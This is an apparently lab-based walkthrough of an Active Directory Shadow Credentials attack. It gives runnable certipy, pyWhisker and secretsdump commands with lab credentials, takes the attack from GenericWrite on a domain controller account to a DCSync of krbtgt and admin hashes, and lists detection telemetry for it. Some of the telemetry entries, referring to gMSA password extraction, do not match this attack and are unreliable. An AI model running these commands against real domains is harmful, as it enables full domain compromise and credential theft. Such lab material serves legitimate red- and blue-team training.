# WT#008 — Shadow Credentials

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | 192.168.77.10 (dc01) |
| **Domain** | cadre.local |
| **Starting Credential** | ops_redcell / R3dC3ll_0ps! |
| **Tools Required** | certipy-ad (or pyWhisker), impacket-secretsdump |
| **Certifications** | CRTE |
| **MITRE ATT&CK** | T1550.003 |
| **Difficulty** | Medium |

## Prerequisites
- ops_redcell has GenericWrite on dc01$ computer object
- dc01$ has no existing `msDS-KeyCredentialLink` value

## Attack Steps

### Step 1 — Verify ACL and add Shadow Credentials to dc01$
```bash
# From kali, use certipy to add KeyCredentialLink to dc01$
# This uses ops_redcell's GenericWrite right

certipy-ad shadow add -u 'ops_redcell@cadre.local' -p 'R3dC3ll_0ps!' -target 'dc01$' -dc-ip 192.168.77.10

# Alternative with pyWhisker
python3 pywhisker.py -d cadre.local -u ops_redcell -p 'R3dC3ll_0ps!' --target 'dc01$' --action add --filename dc01_shadow
```

### Step 2 — Authenticate as dc01$ using the certificate
```bash
# certipy outputs a PFX file — use it for Kerberos PKINIT auth
certipy-ad auth -pfx dc01_shadow.pfx -username dc01$ -domain cadre.local -dc-ip 192.168.77.10

# This produces the NT hash for dc01$
# Sample output: dc01$:<nt_hash>
```

### Step 3 — DCSync as dc01$
```bash
# With dc01$ NT hash, DCSync any user (dc01$ has replication rights)
impacket-secretsdump 'cadre.local/dc01$:<nt_hash>'@192.168.77.10 -just-dc

# Extract krbtgt and DA hashes
impacket-secretsdump 'cadre.local/dc01$:<nt_hash>'@192.168.77.10 -just-dc-user 'cadre\krbtgt'
impacket-secretsdump 'cadre.local/dc01$:<nt_hash>'@192.168.77.10 -just-dc-user 'cadre\chief_command'
```

## Post-Exploitation Chain
WT#008 → dc01$ NT hash → DCSync → DA (chief_command) → full domain compromise → Golden Ticket → AdminSDHolder persistence (WT#025)

## Telemetry Verification
- **Elastic Index:** `logs-system.security-*`
- **Expected Events:**
  - Event ID 5136: Directory service object modification (msDS-KeyCredentialLink added to dc01$)
  - Event ID 4662: ReadProperty on msDS-ManagedPassword (cadre-008-gmsa-extract rule)
  - Event ID 4768: Kerberos TGT request with PKINIT (PKCA) — etype 18 (AES256), cert-based auth
  - Event ID 4624: Logon as dc01$ using certificate
- **Zeek:** `kerberos.log` showing AS-REQ with PKINIT preauth (PA-PK-AS-REP)
- **Suricata:** PKINIT-over-Kerberos traffic flagged as auth method anomaly
- **Elastic Detection Rule:** `cadre-008-gmsa-extract` triggers on `event.code:4662 AND winlog.event_data.ObjectType:msDS-ManagedPassword`

## Status
CONFIGURED
